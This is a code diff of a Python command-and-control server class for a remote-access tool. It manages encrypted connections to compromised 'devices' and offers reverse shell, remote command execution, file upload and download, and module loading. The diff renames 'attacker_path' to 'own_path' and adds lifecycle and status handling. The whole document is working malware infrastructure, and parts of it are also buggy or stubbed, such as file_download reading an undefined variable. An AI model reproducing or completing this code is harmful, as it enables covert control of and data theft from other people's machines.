@@ -3,7 +3,9 @@ class SOCKET():
     def __init__(self, address, port):
         self.address = address
         self.port = port
-        self.start(address, port)
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.stopped = False
+        self.start()
     def revshell(self, id, address, port):
         """Open a Reverse Shell to a given Address:Port
         Args:
@@ -14,7 +16,7 @@ class SOCKET():
         Returns:
             bool: True if success, False if not
             str: Message
-        """  
+        """ 
         try:
             conn, addr = self.connections[id]
         except:
@@ -30,22 +32,26 @@ class SOCKET():
             else:
                 return True, output
     def decrypt(self, data):
+        # Decrypt the data
         return self.fernet.decrypt(data).decode()
 
     def encrypt(self, data):
+        # Encrypt the data
         return self.fernet.encrypt(data.encode())
 
     def refresh_connections(self):
+        # Check if the connections are still alive
         while True:
-            if not threading.main_thread().is_alive():
-                self.server.close()
-                exit()
+            # Check if Server is stopped
+            if self.stopped:
+                break
             for conn_i in self.connections:
                 conn = conn_i[0]
                 try:
                     conn.send(self.encrypt("alive:alive"))
                 except:
                     self.connections.remove(conn_i)
+                    log(f"Connection from {conn_i[1]} has been lost.", alert="error")
             time.sleep(10)
     def rce(self, id, cmd):
         """Send a Cmd to a Device and return the Output
@@ -74,7 +80,7 @@ class SOCKET():
             id (int): Connection ID
         Returns:
             bool: True if success, False if not
-            str: Output of the command
+            str: Infos about the Device
         """  
         try:
             conn, addr = self.connections[id]
@@ -89,6 +95,7 @@ class SOCKET():
             return True, output
 
     def load_module(self, id, module):
+        # Send the Module to the Device
         try:
             conn, addr = self.connections[id]
         except:
@@ -96,6 +103,9 @@ class SOCKET():
         pass
 
     def execute_module(self, id, module):
+        # Send a Request to execute a Module
+        # Check if Modules is loaded
+        # Get Output from the Module
         pass
 
     def get_directory_contents(self, id, dir):
@@ -134,13 +144,15 @@ class SOCKET():
             return True, output
 
     def listen(self):
-        self.server.listen()
         while True:
+            # Check if Server stopped
+            if self.stopped:
+                break
             try:
                 conn, addr = self.server.accept()
-            except OSError:
-                log("A new Device connected, but no new Session could be initialised.", alert="error")
-            except KeyboardInterrupt:
+                self.server.listen()
+            except Exception as e:
+                logging.error(e)
                 exit()
             else:
                 self.connections.append((conn, addr))
@@ -148,25 +160,47 @@ class SOCKET():
                 ph_print(f"New Connection initialised from {addr}")
                 logging.info(f"New Connection initialised from {addr}")
 
-    def start(self, address, port):
+    def start(self):
         self.connections = []
         self.key = Fernet.generate_key()
         self.fernet = Fernet(self.key)
-        SERVER = address
-        ADDR = (SERVER, port)
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ADDR = (self.address, self.port)
         try:
             self.server.bind(ADDR)
         except:
             log("Port is already in use.", alert="critical")
-            exit()
-        threading.Thread(target=self.listen).start()
-        threading.Thread(target=self.refresh_connections).start()
+            raise SystemExit
+        self.server.listen()
+        # Start the Listener and Refresher
+        self.listener = threading.Thread(target=self.listen, name="Listener")
+        self.listener.start()
+        self.refresher = threading.Thread(target=self.refresh_connections, name="Refresher")
+        self.refresher.start()
 
     def stop(self):
-        self.server.close()
-
+        # Stop the Server
+        self.server.shutdown(socket.SHUT_RDWR)
+        self.stopped = True
+    def status(self):
+        """Get Status of the Server
+        
+        Returns:
+            bool: True if socket is running, False if not
+            bool: True if listener is running, False if not
+            bool: True if refresher is running, False if not"""
+        # Return the Status of the Server
+        return self.stopped, self.listener.is_alive(), self.refresher.is_alive()
     def file_upload(self, id, fil, path):
+        """Upload a File to a Device
+        Args:
+            id (int): Connection ID
+            fil (string): File to Upload	
+            path (string): Path to Upload the File to
+
+        Returns:
+            bool: True if success, False if not
+            str: Error or Success Message
+        """
         try:
             conn, addr = self.connections[id]
         except:
@@ -179,13 +213,24 @@ class SOCKET():
             conn.sendfile(f)
             status = self.decrypt(conn.recv(1024))
             if status == "0":
-                raise Exception
+                raise Exception("File Upload Failed")
         except:
             return False, "File could not be uploaded"
         else:
             return True, "File uploaded"
 
-    def file_download(self, id, target_path, attacker_path):
+    def file_download(self, id, device_path, own_path):
+        """Upload a File to a Device
+        Args:
+            id (int): Connection ID
+            fil (string): File to Upload	
+            device_path (string): Path to Download the File from
+            own_path (string): Path to Download the File to
+
+        Returns:
+            bool: True if success, False if not
+            str: Error or Success Message
+        """
         try:
             conn, addr = self.connections[id]
         except:
@@ -193,11 +238,11 @@ class SOCKET():
         try:
             f = open(fil, "rb")
             fil = fil.split("/")
-            conn.send(self.encrypt(f"file-d:{target_path}"))
+            conn.send(self.encrypt(f"file-d:{device_path}"))
             fil = conn.recv(1024)
             if fil == "0":
                 raise Exception
-            with open(attacker_path, "wb") as f:
+            with open(own_path, "wb") as f:
                 f.write(fil)
         except:
             return False, "File not found"
